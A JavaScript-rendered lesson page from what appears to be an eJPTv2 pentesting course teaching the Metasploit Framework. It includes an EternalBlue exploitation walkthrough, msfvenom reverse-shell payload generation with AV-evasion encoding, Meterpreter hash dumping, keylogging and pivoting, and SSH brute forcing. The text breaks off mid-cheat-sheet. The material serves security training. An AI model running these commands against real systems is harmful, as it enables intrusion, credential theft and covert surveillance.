// ============================================
// Section 3: The Metasploit Framework
// ============================================

export function render() {
  return `
<article class="lesson">
  <div class="lesson-header">
    <div class="lesson-section-tag">Host & Network Pentesting</div>
    <h1 class="lesson-title">The Metasploit Framework</h1>
    <div class="lesson-meta">
      <span>⏱ ~60 min</span>
      <span>⚡ 150 XP</span>
      <span>📚 Core Exploitation</span>
    </div>
  </div>

  <div class="story-intro">
    In 2003, a security researcher named HD Moore released a tool that would fundamentally change offensive security forever. Before Metasploit, exploit development was a dark art — you had to write your own shellcode, handle memory addresses by hand, and pray things didn't crash. Metasploit turned exploitation into something modular, repeatable, and accessible. Today it ships with over 2,000 exploits and is the single most tested topic on the eJPTv2 exam. If you master one tool in this entire course, make it this one.
  </div>

  <!-- ==================== SECTION 1: What is Metasploit ==================== -->
  <h2>What is Metasploit?</h2>

  <p>Metasploit is an open-source penetration testing framework maintained by Rapid7. It provides a structured way to find vulnerabilities, develop exploits, and execute them against target systems. Think of it as a Swiss Army knife that comes pre-loaded with thousands of blades.</p>

  <div class="analogy">
    Imagine you're a locksmith with a massive toolbox. Each lock you encounter needs a specific pick (exploit), sometimes you need a special handle to hold the pick (payload), and sometimes you need to prep the lock first (auxiliary modules). Metasploit IS that toolbox — organized, labeled, and ready to go. You don't need to forge your own picks from scratch anymore.
  </div>

  <p>There are two main editions:</p>
  <ul>
    <li><strong>Metasploit Framework (MSF)</strong> — Free, open-source, command-line. This is what you'll use on the eJPT and in real pentesting.</li>
    <li><strong>Metasploit Pro</strong> — Commercial, GUI-based, adds automation and reporting. Nice but not needed for the exam.</li>
  </ul>

  <div class="key-point">
    Metasploit is the <strong>most heavily tested topic</strong> on the eJPTv2. The original INE course dedicates 48 parts to it. You WILL get questions about MSF commands, payloads, Meterpreter, and exploit workflows. Know it cold.
  </div>

  <!-- ==================== SECTION 2: MSF Architecture ==================== -->
  <h2>MSF Architecture — Module Types</h2>

  <p>Metasploit is built on a modular architecture. Everything is a "module" — a self-contained piece of code that does one specific thing. Understanding the module types is critical.</p>

  <table class="port-table">
    <thead>
      <tr><th>Module Type</th><th>Purpose</th><th>Example</th></tr>
    </thead>
    <tbody>
      <tr>
        <td><strong style="color: var(--accent-red);">Exploits</strong></td>
        <td>Code that takes advantage of a vulnerability to gain access</td>
        <td><code>exploit/windows/smb/ms17_010_eternalblue</code></td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-green);">Auxiliary</strong></td>
        <td>Scanning, fuzzing, sniffing, brute-forcing — no payload delivery</td>
        <td><code>auxiliary/scanner/smb/smb_version</code></td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-orange);">Payloads</strong></td>
        <td>Code that runs on the target AFTER exploitation succeeds</td>
        <td><code>windows/meterpreter/reverse_tcp</code></td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-yellow);">Encoders</strong></td>
        <td>Obfuscate payloads to evade antivirus / IDS detection</td>
        <td><code>x86/shikata_ga_nai</code></td>
      </tr>
      <tr>
        <td><strong style="color: #a78bfa;">Post</strong></td>
        <td>Post-exploitation modules — run AFTER you have a session</td>
        <td><code>post/windows/gather/hashdump</code></td>
      </tr>
      <tr>
        <td><strong style="color: var(--text-dim);">NOPs</strong></td>
        <td>No-operation instructions — used as padding in buffer overflows</td>
        <td><code>x86/single_byte</code></td>
      </tr>
    </tbody>
  </table>

  <div class="hacker-note">
    On the exam, you need to know the difference between these module types. The most common mistake is confusing <strong>auxiliary</strong> (information gathering, no exploit) with <strong>exploit</strong> (actively compromises a target). Auxiliary modules NEVER deliver a payload — they scan, enumerate, or brute-force.
  </div>

  <!-- ==================== SECTION 3: Starting Metasploit ==================== -->
  <h2>Starting Metasploit</h2>

  <p>Before you can exploit anything, you need to get Metasploit running. On Kali Linux, it's pre-installed.</p>

  <div class="code-block">
    <span class="code-label">Initialize & Launch</span>
<span class="comment"># Initialize the Metasploit database (run once, first time setup)</span>
<span class="cmd">sudo msfdb init</span>

<span class="comment"># Start Metasploit console</span>
<span class="cmd">msfconsole</span>

<span class="comment"># Check database connection (inside msfconsole)</span>
msf6 > <span class="cmd">db_status</span>
[*] Connected to msf. Connection type: postgresql.

<span class="comment"># Check version</span>
msf6 > <span class="cmd">version</span>
  </div>

  <h3>Workspace Management</h3>
  <p>Workspaces keep your data organized. Each engagement or target gets its own workspace so results don't mix together.</p>

  <div class="code-block">
    <span class="code-label">Workspace Commands</span>
<span class="comment"># List workspaces (* = current)</span>
msf6 > <span class="cmd">workspace</span>
* default

<span class="comment"># Create a new workspace</span>
msf6 > <span class="cmd">workspace -a pentest_lab</span>
[*] Added workspace: pentest_lab

<span class="comment"># Switch workspace</span>
msf6 > <span class="cmd">workspace pentest_lab</span>

<span class="comment"># Delete a workspace</span>
msf6 > <span class="cmd">workspace -d old_project</span>

<span class="comment"># Import Nmap scan results into the database</span>
msf6 > <span class="cmd">db_nmap -sV -O 10.10.10.0/24</span>

<span class="comment"># View discovered hosts</span>
msf6 > <span class="cmd">hosts</span>

<span class="comment"># View discovered services</span>
msf6 > <span class="cmd">services</span>
  </div>

  <div class="key-point">
    <strong>db_nmap</strong> is incredibly useful. It runs Nmap AND automatically stores results in the Metasploit database. You can then reference discovered hosts and services directly in your exploits. Always run <code>db_nmap</code> instead of regular <code>nmap</code> when working inside MSF.
  </div>

  <!-- ==================== SECTION 4: Core Commands ==================== -->
  <h2>Core MSF Commands</h2>

  <p>These are the commands you'll type hundreds of times. Burn them into muscle memory.</p>

  <table class="port-table">
    <thead>
      <tr><th>Command</th><th>What It Does</th><th>Example</th></tr>
    </thead>
    <tbody>
      <tr>
        <td><code>search [term]</code></td>
        <td>Search for modules by name, CVE, platform, etc.</td>
        <td><code>search eternalblue</code></td>
      </tr>
      <tr>
        <td><code>use [module]</code></td>
        <td>Select a module to configure and run</td>
        <td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td>
      </tr>
      <tr>
        <td><code>show options</code></td>
        <td>Display configurable options for the current module</td>
        <td><code>show options</code></td>
      </tr>
      <tr>
        <td><code>set RHOSTS [ip]</code></td>
        <td>Set the target IP (Remote Host)</td>
        <td><code>set RHOSTS 10.10.10.5</code></td>
      </tr>
      <tr>
        <td><code>set LHOST [ip]</code></td>
        <td>Set YOUR IP (for reverse shells to call back to)</td>
        <td><code>set LHOST 10.10.14.2</code></td>
      </tr>
      <tr>
        <td><code>set LPORT [port]</code></td>
        <td>Set the listening port on your machine</td>
        <td><code>set LPORT 4444</code></td>
      </tr>
      <tr>
        <td><code>run</code> / <code>exploit</code></td>
        <td>Execute the current module</td>
        <td><code>run</code> or <code>exploit</code></td>
      </tr>
      <tr>
        <td><code>back</code></td>
        <td>Exit the current module (return to base prompt)</td>
        <td><code>back</code></td>
      </tr>
      <tr>
        <td><code>info</code></td>
        <td>Show detailed info about the current module</td>
        <td><code>info</code></td>
      </tr>
      <tr>
        <td><code>show payloads</code></td>
        <td>List compatible payloads for the current exploit</td>
        <td><code>show payloads</code></td>
      </tr>
      <tr>
        <td><code>set PAYLOAD [path]</code></td>
        <td>Set the payload to deliver</td>
        <td><code>set PAYLOAD windows/meterpreter/reverse_tcp</code></td>
      </tr>
      <tr>
        <td><code>setg [option] [value]</code></td>
        <td>Set a GLOBAL option (persists across modules)</td>
        <td><code>setg RHOSTS 10.10.10.5</code></td>
      </tr>
      <tr>
        <td><code>sessions</code></td>
        <td>List all active sessions</td>
        <td><code>sessions -l</code></td>
      </tr>
      <tr>
        <td><code>sessions -i [id]</code></td>
        <td>Interact with a specific session</td>
        <td><code>sessions -i 1</code></td>
      </tr>
    </tbody>
  </table>

  <div class="try-it">
    <p>Try this typical workflow in msfconsole:</p>
    <button class="try-cmd">search eternalblue</button>
    <button class="try-cmd">use exploit/windows/smb/ms17_010_eternalblue</button>
    <button class="try-cmd">show options</button>
    <button class="try-cmd">set RHOSTS 10.10.10.5</button>
    <button class="try-cmd">set LHOST 10.10.14.2</button>
    <button class="try-cmd">info</button>
  </div>

  <div class="warning">
    <strong>RHOSTS vs RHOST:</strong> Some modules use <code>RHOSTS</code> (plural — accepts multiple targets, CIDR ranges), others use <code>RHOST</code> (singular — one target only). Always run <code>show options</code> to see which one the module expects. Setting the wrong one means your module won't know where to aim.
  </div>

  <!-- ==================== SECTION 5: Payload Types ==================== -->
  <h2>Payload Types — What Runs After Exploitation</h2>

  <p>An exploit gets you through the door. A payload is what you DO once you're inside. Understanding payload types is essential for the exam.</p>

  <h3>Three Categories of Payloads</h3>

  <table class="port-table">
    <thead>
      <tr><th>Type</th><th>Description</th><th>Example</th></tr>
    </thead>
    <tbody>
      <tr>
        <td><strong style="color: var(--accent-red);">Singles (Inline)</strong></td>
        <td>Self-contained, standalone. The entire payload is sent in one shot. Simple but limited in functionality.</td>
        <td><code>windows/shell_reverse_tcp</code> (note: single slash = single)</td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-green);">Stagers</strong></td>
        <td>Tiny payload that sets up a communication channel between attacker and target. Its only job is to download the stage.</td>
        <td><code>windows/meterpreter/<strong>reverse_tcp</strong></code> (the reverse_tcp part is the stager)</td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-orange);">Stages</strong></td>
        <td>Downloaded BY the stager. This is the full-featured payload (like Meterpreter). Too big to send in one shot.</td>
        <td><code><strong>windows/meterpreter</strong>/reverse_tcp</code> (the meterpreter part is the stage)</td>
      </tr>
    </tbody>
  </table>

  <div class="key-point">
    <strong>How to tell them apart by name:</strong><br>
    <code>windows/shell_reverse_tcp</code> — Single slash = <strong>single/inline</strong> payload. Self-contained.<br>
    <code>windows/meterpreter/reverse_tcp</code> — Double slash = <strong>staged</strong> payload. Stager (reverse_tcp) downloads stage (meterpreter).<br><br>
    This naming convention shows up on the exam. If you see one slash in the payload path, it's a single. Two slashes means staged.
  </div>

  <h3>Reverse Shell vs Bind Shell</h3>

  <table class="port-table">
    <thead>
      <tr><th>Type</th><th>How It Works</th><th>When to Use</th></tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Reverse Shell</strong></td>
        <td>Target connects BACK to your machine. You set up a listener, and the compromised target calls home to you.</td>
        <td>Default choice. Works when target is behind a firewall that blocks inbound connections but allows outbound.</td>
      </tr>
      <tr>
        <td><strong>Bind Shell</strong></td>
        <td>Target opens a port and WAITS for you to connect to it. The target becomes the listener.</td>
        <td>When you can't receive connections (your machine is behind NAT). Less common because firewalls usually block this.</td>
      </tr>
    </tbody>
  </table>

  <div class="analogy">
    Reverse shell: You give the target your phone number and they call you. Works even if they're behind a locked door (firewall) — most doors let you make outgoing calls.<br><br>
    Bind shell: The target sits by their phone and waits for YOU to call them. If their door is locked (firewall blocking inbound), you can't reach them. That's why reverse shells are preferred.
  </div>

  <h3>Meterpreter — THE Payload</h3>

  <p>Meterpreter is Metasploit's flagship payload. It's not a regular shell — it's a sophisticated, in-memory agent that gives you incredible control over the compromised system.</p>

  <div class="key-point">
    <strong>Why Meterpreter is special:</strong>
    <ul>
      <li><strong>Runs in memory</strong> — never touches disk, harder for AV to detect</li>
      <li><strong>Encrypted communication</strong> — TLS-encrypted channel between you and the target</li>
      <li><strong>Extensible</strong> — load additional modules on the fly (keyloggers, pivoting tools, etc.)</li>
      <li><strong>Platform-aware</strong> — has Windows-specific and Linux-specific commands built in</li>
      <li><strong>Seamless</strong> — switch between Meterpreter and a regular OS shell anytime</li>
    </ul>
  </div>

  <h3>Common Payloads You Must Know</h3>

  <div class="code-block">
    <span class="code-label">Common Payloads</span>
<span class="comment"># Windows — Meterpreter reverse shell (MOST COMMON)</span>
<span class="val">windows/meterpreter/reverse_tcp</span>

<span class="comment"># Windows — Plain command shell (staged)</span>
<span class="val">windows/shell/reverse_tcp</span>

<span class="comment"># Windows — Plain command shell (single/inline)</span>
<span class="val">windows/shell_reverse_tcp</span>

<span class="comment"># Linux x64 — Meterpreter reverse shell</span>
<span class="val">linux/x64/meterpreter/reverse_tcp</span>

<span class="comment"># Linux — Plain shell</span>
<span class="val">linux/x64/shell_reverse_tcp</span>

<span class="comment"># PHP — Meterpreter (for web server exploitation)</span>
<span class="val">php/meterpreter/reverse_tcp</span>

<span class="comment"># Java — Meterpreter (for Tomcat, Jenkins, etc.)</span>
<span class="val">java/meterpreter/reverse_tcp</span>
  </div>

  <!-- ==================== SECTION 6: Meterpreter Commands ==================== -->
  <h2>Meterpreter Commands — Post-Exploitation Power</h2>

  <p>Once you have a Meterpreter session, you have an incredible toolkit at your disposal. These are the commands you'll use most:</p>

  <h3>System Information & Privilege Escalation</h3>

  <div class="code-block">
    <span class="code-label">Meterpreter Basics</span>
<span class="comment"># System info — OS, architecture, hostname, domain</span>
meterpreter > <span class="cmd">sysinfo</span>
Computer    : WIN-TARGET01
OS          : Windows Server 2016 (6.3 Build 14393)
Architecture: x64
Domain      : CORP

<span class="comment"># Who are you? (current user)</span>
meterpreter > <span class="cmd">getuid</span>
Server username: CORP\\webuser

<span class="comment"># Attempt to escalate to SYSTEM (Windows)</span>
meterpreter > <span class="cmd">getsystem</span>
...got system via technique 1 (Named Pipe Impersonation)

<span class="comment"># Get current process ID</span>
meterpreter > <span class="cmd">getpid</span>
Current pid: 3456
  </div>

  <h3>File Operations</h3>

  <div class="code-block">
    <span class="code-label">File Transfer</span>
<span class="comment"># Upload a file TO the target</span>
meterpreter > <span class="cmd">upload /home/kali/linpeas.sh /tmp/linpeas.sh</span>

<span class="comment"># Download a file FROM the target</span>
meterpreter > <span class="cmd">download C:\\Users\\Admin\\Desktop\\passwords.txt</span>

<span class="comment"># List files</span>
meterpreter > <span class="cmd">ls</span>

<span class="comment"># Change directory</span>
meterpreter > <span class="cmd">cd C:\\Users</span>

<span class="comment"># Print working directory</span>
meterpreter > <span class="cmd">pwd</span>
  </div>

  <h3>Shells & System Access</h3>

  <div class="code-block">
    <span class="code-label">Shells & Access</span>
<span class="comment"># Drop to an OS-level command shell</span>
meterpreter > <span class="cmd">shell</span>
Process 2846 created.
Channel 1 created.
C:\\Windows\\system32>

<span class="comment"># Press Ctrl+Z to background the channel and return to Meterpreter</span>

<span class="comment"># Dump password hashes (requires SYSTEM privs on Windows)</span>
meterpreter > <span class="cmd">hashdump</span>
Administrator:500:aad3b...:::
Guest:501:aad3b...:::
webuser:1001:aad3b...:::

<span class="comment"># Take a screenshot of the target's desktop</span>
meterpreter > <span class="cmd">screenshot</span>
Screenshot saved to: /home/kali/xKzERphw.jpeg

<span class="comment"># Start a keylogger</span>
meterpreter > <span class="cmd">keyscan_start</span>
Starting the keystroke sniffer...

<span class="comment"># Dump captured keystrokes</span>
meterpreter > <span class="cmd">keyscan_dump</span>
Dumping captured keystrokes...
admin password123 <Return>
  </div>

  <div class="warning">
    <strong>hashdump requires SYSTEM or Administrator privileges.</strong> If <code>getuid</code> shows you're a low-privilege user, you need to escalate first with <code>getsystem</code> or a local privilege escalation exploit. Running hashdump as a normal user will fail.
  </div>

  <h3>Process Migration</h3>

  <div class="code-block">
    <span class="code-label">Process Migration</span>
<span class="comment"># List running processes</span>
meterpreter > <span class="cmd">ps</span>
PID   Name              User
---   ----              ----
468   lsass.exe         NT AUTHORITY\\SYSTEM
1204  explorer.exe      CORP\\admin
3456  payload.exe       CORP\\webuser    <-- you are here

<span class="comment"># Migrate to a more stable/privileged process</span>
meterpreter > <span class="cmd">migrate 1204</span>
[*] Migrating from 3456 to 1204...
[*] Migration completed successfully.
  </div>

  <div class="key-point">
    <strong>Why migrate?</strong> Your initial payload might be running inside a process that could get killed (like a browser or temp executable). Migrating moves your Meterpreter session into a more stable process like <code>explorer.exe</code> or <code>svchost.exe</code>. It also lets you inherit that process's permissions — migrate to a SYSTEM process to get SYSTEM privs.
  </div>

  <h3>Pivoting & Port Forwarding</h3>

  <div class="code-block">
    <span class="code-label">Network Pivoting</span>
<span class="comment"># Port forwarding — access an internal service through the compromised host</span>
<span class="comment"># Forward local port 8080 to target's internal 10.10.20.5:80</span>
meterpreter > <span class="cmd">portfwd add -l 8080 -p 80 -r 10.10.20.5</span>
[*] Forward TCP relay created: (local) :8080 -> (remote) 10.10.20.5:80

<span class="comment"># Now on your Kali, browse to http://127.0.0.1:8080 to reach 10.10.20.5:80</span>

<span class="comment"># Add a route through the Meterpreter session to reach another subnet</span>
<span class="comment"># (run this from the msf6 prompt, not Meterpreter)</span>
msf6 > <span class="cmd">route add 10.10.20.0/24 1</span>
<span class="comment"># "1" is the session ID — all traffic to 10.10.20.0/24 goes through session 1</span>

<span class="comment"># Verify routes</span>
msf6 > <span class="cmd">route print</span>
  </div>

  <div class="hacker-note">
    Pivoting is a huge topic on the eJPT. The scenario: you compromise Machine A, but Machine B is on an internal network only reachable from Machine A. You use <code>route</code> and <code>portfwd</code> to tunnel through your Meterpreter session on Machine A to attack Machine B. Without pivoting, Machine B is invisible to you.
  </div>

  <!-- ==================== SECTION 7: Auxiliary Modules ==================== -->
  <h2>MSF Auxiliary Modules — Scanning & Enumeration</h2>

  <p>Auxiliary modules are your recon tools inside Metasploit. They don't exploit anything — they gather information, scan for services, and brute-force credentials.</p>

  <h3>Key Auxiliary Modules for the eJPT</h3>

  <div class="code-block">
    <span class="code-label">SMB Version Scanner</span>
<span class="comment"># Identify SMB version — critical for finding EternalBlue targets</span>
msf6 > <span class="cmd">use auxiliary/scanner/smb/smb_version</span>
msf6 auxiliary(scanner/smb/smb_version) > <span class="cmd">set RHOSTS 10.10.10.0/24</span>
msf6 auxiliary(scanner/smb/smb_version) > <span class="cmd">run</span>

[*] 10.10.10.5 - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1)
    Host: WIN-TARGET01, OS: Windows Server 2008 R2
  </div>

  <div class="code-block">
    <span class="code-label">SSH Brute Force</span>
<span class="comment"># Brute-force SSH credentials</span>
msf6 > <span class="cmd">use auxiliary/scanner/ssh/ssh_login</span>
msf6 auxiliary(scanner/ssh/ssh_login) > <span class="cmd">set RHOSTS 10.10.10.5</span>
msf6 auxiliary(scanner/ssh/ssh_login) > <span class="cmd">set USER_FILE /usr/share/wordlists/users.txt</span>
msf6 auxiliary(scanner/ssh/ssh_login) > <span class="cmd">set PASS_FILE /usr/share/wordlists/rockyou.txt</span>
msf6 auxiliary(scanner/ssh/ssh_login) > <span class="cmd">set STOP_ON_SUCCESS true</span>
msf6 auxiliary(scanner/ssh/ssh_login) > <span class="cmd">run</span>
  </div>

  <div class="code-block">
    <span class="code-label">FTP Anonymous Check</span>
<span class="comment"># Check if FTP allows anonymous login</span>
msf6 > <span class="cmd">use auxiliary/scanner/ftp/ftp_anonymous</span>
msf6 auxiliary(scanner/ftp/ftp_anonymous) > <span class="cmd">set RHOSTS 10.10.10.0/24</span>
msf6 auxiliary(scanner/ftp/ftp_anonymous) > <span class="cmd">run</span>

[+] 10.10.10.12 - FTP Anonymous Login Allowed!
  </div>

  <div class="code-block">
    <span class="code-label">HTTP Version Detection</span>
<span class="comment"># Identify web server software and version</span>
msf6 > <span class="cmd">use auxiliary/scanner/http/http_version</span>
msf6 auxiliary(scanner/http/http_version) > <span class="cmd">set RHOSTS 10.10.10.0/24</span>
msf6 auxiliary(scanner/http/http_version) > <span class="cmd">run</span>

[+] 10.10.10.8 - Apache/2.4.29 (Ubuntu)
[+] 10.10.10.15 - Microsoft-IIS/10.0
  </div>

  <div class="try-it">
    <p>Practice using auxiliary modules in msfconsole:</p>
    <button class="try-cmd">search type:auxiliary scanner/smb</button>
    <button class="try-cmd">use auxiliary/scanner/smb/smb_version</button>
    <button class="try-cmd">show options</button>
    <button class="try-cmd">search type:auxiliary ssh</button>
  </div>

  <!-- ==================== SECTION 8: msfvenom ==================== -->
  <h2>msfvenom — Payload Generation</h2>

  <p><code>msfvenom</code> is a standalone command-line tool (not inside msfconsole) that generates payloads in various formats. You use it to create malicious executables, scripts, or shellcode that connect back to your Metasploit listener.</p>

  <div class="code-block">
    <span class="code-label">Basic msfvenom Usage</span>
<span class="comment"># Windows reverse shell EXE</span>
<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > shell.exe</span>

<span class="comment"># Linux reverse shell ELF binary</span>
<span class="cmd">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf > shell.elf</span>

<span class="comment"># PHP reverse shell (upload to web server)</span>
<span class="cmd">msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.php</span>

<span class="comment"># Python reverse shell</span>
<span class="cmd">msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > shell.py</span>

<span class="comment"># ASP reverse shell (IIS web servers)</span>
<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f asp > shell.asp</span>

<span class="comment"># WAR file (Tomcat deployment)</span>
<span class="cmd">msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war</span>
  </div>

  <h3>Encoding Payloads for AV Evasion</h3>

  <div class="code-block">
    <span class="code-label">Encoding with msfvenom</span>
<span class="comment"># Encode payload with shikata_ga_nai, 10 iterations</span>
<span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe</span>

<span class="comment"># List available encoders</span>
<span class="cmd">msfvenom --list encoders</span>

<span class="comment"># List all available payload formats</span>
<span class="cmd">msfvenom --list formats</span>
  </div>

  <div class="warning">
    <strong>Encoding is NOT reliable AV evasion anymore.</strong> Modern antivirus uses behavioral analysis, not just signature matching. shikata_ga_nai was effective years ago but is now heavily signatured itself. For the eJPT, know how encoding works conceptually, but don't rely on it against modern defenses. In exam labs, AV is usually disabled anyway.
  </div>

  <h3>Key msfvenom Flags</h3>

  <table class="port-table">
    <thead>
      <tr><th>Flag</th><th>Purpose</th><th>Example</th></tr>
    </thead>
    <tbody>
      <tr><td><code>-p</code></td><td>Payload to use</td><td><code>-p windows/meterpreter/reverse_tcp</code></td></tr>
      <tr><td><code>-f</code></td><td>Output format</td><td><code>-f exe</code>, <code>-f elf</code>, <code>-f php</code></td></tr>
      <tr><td><code>-e</code></td><td>Encoder to use</td><td><code>-e x86/shikata_ga_nai</code></td></tr>
      <tr><td><code>-i</code></td><td>Number of encoding iterations</td><td><code>-i 10</code></td></tr>
      <tr><td><code>-o</code></td><td>Output file (alternative to <code>></code>)</td><td><code>-o shell.exe</code></td></tr>
      <tr><td><code>LHOST</code></td><td>Your IP address</td><td><code>LHOST=10.10.14.2</code></td></tr>
      <tr><td><code>LPORT</code></td><td>Your listening port</td><td><code>LPORT=4444</code></td></tr>
    </tbody>
  </table>

  <!-- ==================== SECTION 9: Exploit Workflow ==================== -->
  <h2>Exploit Workflow — Step by Step</h2>

  <p>Let's walk through a complete exploitation scenario from start to finish. This is the exact process you'll follow on the exam.</p>

  <div class="analogy">
    Think of this like a heist movie. Step 1: Case the building (scan). Step 2: Find a weak point (vulnerability). Step 3: Pick the right tool (exploit + payload). Step 4: Configure the job (set options). Step 5: Execute the plan (run). Step 6: Once inside, loot the vault (post-exploitation).
  </div>

  <div class="code-block">
    <span class="code-label">Complete Exploitation Walkthrough</span>
<span class="comment"># STEP 1: Scan the target with db_nmap</span>
msf6 > <span class="cmd">db_nmap -sV -sC 10.10.10.5</span>
[*] 445/tcp open  microsoft-ds  Windows Server 2008 R2 SMB

<span class="comment"># STEP 2: Search for a relevant exploit</span>
msf6 > <span class="cmd">search type:exploit smb ms17</span>
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  great

<span class="comment"># STEP 3: Select the exploit</span>
msf6 > <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>

<span class="comment"># STEP 4: Check what options need to be set</span>
msf6 exploit(...) > <span class="cmd">show options</span>
   RHOSTS   (required, not set)
   LHOST    (required, not set)
   LPORT    4444 (default)

<span class="comment"># STEP 5: Configure the exploit</span>
msf6 exploit(...) > <span class="cmd">set RHOSTS 10.10.10.5</span>
msf6 exploit(...) > <span class="cmd">set LHOST 10.10.14.2</span>

<span class="comment"># STEP 6: (Optional) Choose a specific payload</span>
msf6 exploit(...) > <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>

<span class="comment"># STEP 7: Launch the exploit</span>
msf6 exploit(...) > <span class="cmd">run</span>

[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Sending exploit packet...
[*] Sending stage (200774 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened

<span class="comment"># STEP 8: Post-exploitation</span>
meterpreter > <span class="cmd">sysinfo</span>
meterpreter > <span class="cmd">getuid</span>
meterpreter > <span class="cmd">hashdump</span>
  </div>

  <div class="key-point">
    <strong>The exam workflow is always the same:</strong> Scan → Identify vulnerable service → Search for exploit → Use exploit → Set options → Run → Post-exploit. If an exploit fails, check: Is the target actually vulnerable? Is RHOSTS correct? Is LHOST set to YOUR tun0/eth0 IP? Is the payload compatible with the target architecture (x86 vs x64)?
  </div>

  <!-- ==================== SECTION 10: Multi/Handler ==================== -->
  <h2>Multi/Handler — The Universal Listener</h2>

  <p>When you generate a payload with <code>msfvenom</code> and deliver it to the target (via social engineering, file upload, etc.), you need something listening on your end to catch the reverse connection. That's <code>exploit/multi/handler</code>.</p>

  <div class="code-block">
    <span class="code-label">Setting Up a Listener</span>
<span class="comment"># Step 1: Generate payload (separate terminal)</span>
$ <span class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe</span>

<span class="comment"># Step 2: Set up the handler in msfconsole</span>
msf6 > <span class="cmd">use exploit/multi/handler</span>
msf6 exploit(multi/handler) > <span class="cmd">set PAYLOAD windows/meterpreter/reverse_tcp</span>
msf6 exploit(multi/handler) > <span class="cmd">set LHOST 10.10.14.2</span>
msf6 exploit(multi/handler) > <span class="cmd">set LPORT 4444</span>
msf6 exploit(multi/handler) > <span class="cmd">run</span>

[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Waiting for connections...

<span class="comment"># Step 3: Deliver shell.exe to the target and execute it</span>
<span class="comment"># When the target runs shell.exe, you'll see:</span>

[*] Sending stage (200774 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.5:49165)

meterpreter >
  </div>

  <div class="warning">
    <strong>The payload in multi/handler MUST match the payload used in msfvenom EXACTLY.</strong> If you generated with <code>windows/meterpreter/reverse_tcp</code>, you must set the same payload in the handler. Mismatched payloads = the connection will fail silently. This is a common exam mistake.
  </div>

  <div class="hacker-note">
    Use <code>exploit -j</code> instead of <code>run</code> to start the handler as a <strong>background job</strong>. This keeps your msfconsole prompt free while waiting for connections. You can then use other modules while the handler listens in the background. Use <code>jobs</code> to list background jobs and <code>sessions</code> to see incoming connections.
  </div>

  <!-- ==================== SECTION 11: Post-Exploitation Modules ==================== -->
  <h2>Post-Exploitation Modules</h2>

  <p>Post modules run AFTER you have an active session. They automate common post-exploitation tasks like credential harvesting, enumeration, and persistence.</p>

  <div class="code-block">
    <span class="code-label">Essential Post Modules</span>
<span class="comment"># Dump Windows password hashes (alternative to Meterpreter hashdump)</span>
msf6 > <span class="cmd">use post/windows/gather/hashdump</span>
msf6 post(windows/gather/hashdump) > <span class="cmd">set SESSION 1</span>
msf6 post(windows/gather/hashdump) > <span class="cmd">run</span>

[+] Administrator:500:aad3b435...::
[+] Guest:501:aad3b435...::

<span class="comment"># Upgrade a basic shell to Meterpreter</span>
msf6 > <span class="cmd">use post/multi/manage/shell_to_meterpreter</span>
msf6 post(multi/manage/shell_to_meterpreter) > <span class="cmd">set SESSION 2</span>
msf6 post(multi/manage/shell_to_meterpreter) > <span class="cmd">set LHOST 10.10.14.2</span>
msf6 post(multi/manage/shell_to_meterpreter) > <span class="cmd">run</span>

[*] Upgrading session ID: 2
[*] Meterpreter session 3 opened

<span class="comment"># Now interact with the new Meterpreter session</span>
msf6 > <span class="cmd">sessions -i 3</span>
meterpreter >
  </div>

  <div class="key-point">
    <strong>shell_to_meterpreter</strong> is essential. Sometimes an exploit only gives you a basic command shell (no Meterpreter features). This module upgrades it to a full Meterpreter session so you get all the fancy commands like <code>hashdump</code>, <code>migrate</code>, and <code>portfwd</code>.
  </div>

  <div class="code-block">
    <span class="code-label">Other Useful Post Modules</span>
<span class="comment"># Enumerate system information</span>
<span class="cmd">post/windows/gather/enum_applications</span>    <span class="comment"># Installed software</span>
<span class="cmd">post/windows/gather/enum_logged_on_users</span>  <span class="comment"># Who's logged in</span>
<span class="cmd">post/windows/gather/checkvm</span>               <span class="comment"># Is it a virtual machine?</span>

<span class="comment"># Credential gathering</span>
<span class="cmd">post/windows/gather/credentials/credential_collector</span>
<span class="cmd">post/multi/gather/ssh_creds</span>

<span class="comment"># Search for interesting files</span>
<span class="cmd">post/multi/gather/firefox_creds</span>
<span class="cmd">post/windows/gather/enum_shares</span>           <span class="comment"># SMB shares</span>
  </div>

  <div class="try-it">
    <p>Explore post modules in msfconsole:</p>
    <button class="try-cmd">search type:post windows/gather</button>
    <button class="try-cmd">search type:post multi/manage</button>
    <button class="try-cmd">search shell_to_meterpreter</button>
  </div>

  <!-- ==================== QUICK REFERENCE ==================== -->
  <h2>Quick Reference — MSF Cheat Sheet</h2>

  <table class="port-table">
    <thead>
      <tr><th>Task</th><th>Command</th></tr>
    </thead>
    <tbody>
      <tr><td>Start MSF</td><td><code>msfconsole</code></td></tr>
      <tr><td>Init database</td><td><code>sudo msfdb init</code></td></tr>
      <tr><td>Search modules</td><td><code>search [keyword]</code></td></tr>
      <tr><td>Use a module</td><td><code>use [module/path]</code></td></tr>
      <tr><td>View options</td><td><code>show options</code></td></tr>
